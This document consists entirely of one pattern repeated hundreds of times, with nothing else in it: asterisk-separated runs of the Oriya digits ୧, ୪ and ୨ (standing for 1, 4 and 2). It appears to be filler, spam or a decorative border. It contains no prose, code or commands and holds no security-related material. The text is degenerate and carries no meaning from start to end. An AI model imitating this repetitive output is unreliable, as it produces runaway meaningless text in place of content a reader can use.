*୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* 